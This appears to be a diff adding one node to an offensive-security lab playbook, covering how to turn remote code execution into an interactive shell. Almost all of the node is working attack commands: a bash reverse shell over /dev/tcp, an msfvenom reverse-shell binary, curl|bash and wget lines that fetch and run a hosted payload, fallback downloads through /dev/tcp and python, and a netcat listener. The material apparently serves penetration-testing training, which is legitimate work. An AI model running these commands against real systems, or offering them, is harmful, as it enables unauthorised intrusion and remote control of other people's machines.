@@ -1,0 +1,34 @@
+{
+  "id": "hosted_shell",
+  "phase": "SHELL",
+  "title": "Hosted Shell — RCE to Session via curl/wget Fetch",
+  "body": "Once you have command execution (RFI/LFI->RCE, SMTP injection, webshell, any &cmd= primitive), DON'T cram a reverse-shell one-liner into the exploit channel - the >, &, |, quotes and /dev/tcp get mangled by URL parsers, SMTP MAIL FROM filters, and shell quoting (this is what burned Snookums on URL-encoding and Bratarina on the 503 metacharacter filter). Instead: host the shell as a FILE on your box, and have the target fetch+run it. The only thing crossing the hostile channel is a trivially simple 'curl URL|bash' - no special characters to break. All the fragile syntax lives safely in the file. Two tracks: a bash SCRIPT (curl|bash, no chmod needed) or a compiled ELF BINARY (msfvenom, requires chmod +x). Pick the port the target can actually reach - egress is often 80/443 only, so default your callback there.",
+  "cmd": "# ══════════════════════════════════════════════════\n# SETUP (your box) - host with PYTHON, never Apache (Apache executes .php before serving)\n# ══════════════════════════════════════════════════\nLHOST=192.168.45.211        # your tun0 IP\nLPORT=80                    # match listener; 80/443 survive egress filtering\n\n# ── TRACK A: bash script (no chmod - bash reads contents as input) ──\ncat > shell.sh << EOF\n#!/bin/bash\nbash -i >& /dev/tcp/$LHOST/$LPORT 0>&1\nEOF\n\npython3 -m http.server 80   # serve the file (terminal 1)\nnc -lvnp $LPORT             # listener (terminal 2)\n\n# Fetch + run from the target via your RCE. NONE of these need chmod:\n#   curl http://LHOST/shell.sh | bash\n#   wget -qO- http://LHOST/shell.sh | bash\n#   curl http://LHOST/shell.sh -o /tmp/s; bash /tmp/s        # if pipe | is filtered\n#   wget http://LHOST/shell.sh -O /tmp/s; bash /tmp/s\n# 'bash file' and '| bash' both feed CONTENTS to bash -> execute bit irrelevant.\n\n# ══════════════════════════════════════════════════\n# TRACK B: compiled ELF (msfvenom) - REQUIRES chmod +x (no interpreter to pipe to)\n#   This is the official Bratarina method.\n# ══════════════════════════════════════════════════\nmsfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=$LHOST LPORT=$LPORT\npython3 -m http.server 80\nnc -lvnp $LPORT\n# Three fires from the target (binary CANNOT be bash'd, so chmod is mandatory):\n#   wget http://LHOST/shell -O /tmp/shell\n#   chmod +x /tmp/shell\n#   /tmp/shell\n\n# ══════════════════════════════════════════════════\n# CHMOD RULE OF THUMB\n#   curl|bash       -> NO chmod (contents piped to bash)\n#   bash /tmp/s      -> NO chmod (file read as input)\n#   ./tmp/s          -> chmod +x REQUIRED (OS executes file directly)\n#   /tmp/shell (ELF) -> chmod +x REQUIRED (it's a binary)\n# ══════════════════════════════════════════════════\n\n# ── NO curl OR wget on the target? ──\n# bash builtin /dev/tcp download (no tools needed):\n#   exec 3<>/dev/tcp/LHOST/80; echo -e 'GET /shell.sh HTTP/1.0\\r\\n\\r\\n' >&3; cat <&3 | tail -n +12 > /tmp/s; bash /tmp/s\n# python (if present):\n#   python -c 'import urllib;urllib.urlretrieve(\"http://LHOST/shell.sh\",\"/tmp/s\")'; bash /tmp/s\n#   python3 -c 'import urllib.request;urllib.request.urlretrieve(\"http://LHOST/shell.sh\",\"/tmp/s\")'; bash /tmp/s\n\n# ── PROVE EGRESS FIRST if the callback won't land ──\nsudo tcpdump -i tun0 icmp\n#   <RCE> ping -c 3 LHOST     # replies = box can reach you; it's the port/payload, not the network\n# Replies but no shell  -> wrong port (use 80/443).  No replies -> egress blocked, loot via RCE + pivot SSH.",
+  "warn": "Host with python3 -m http.server, NOT Apache (Apache runs .php server-side and the target gets empty output). curl|bash and bash /tmp/s need NO chmod; a downloaded ELF or a ./file invocation DOES. Match your callback port to the listener and prefer 80/443 - restrictive boxes filter outbound on everything else, so the shell silently times out even though the fetch succeeded.",
+  "choices": [
+    {
+      "label": "Shell landed — upgrade to full TTY",
+      "next": "shell_upgrade"
+    },
+    {
+      "label": "Listener set up — catching the shell",
+      "next": "reverse_shell"
+    },
+    {
+      "label": "Won't connect — port/encoding/egress debug ladder",
+      "next": "php_webshell"
+    },
+    {
+      "label": "No curl/wget — need other transfer methods",
+      "next": "transfer_linux"
+    },
+    {
+      "label": "On the box — start Linux post-exploit enum",
+      "next": "linux_post_exploit"
+    },
+    {
+      "label": "Back to jump menu",
+      "next": "jump_menu"
+    }
+  ]
+}
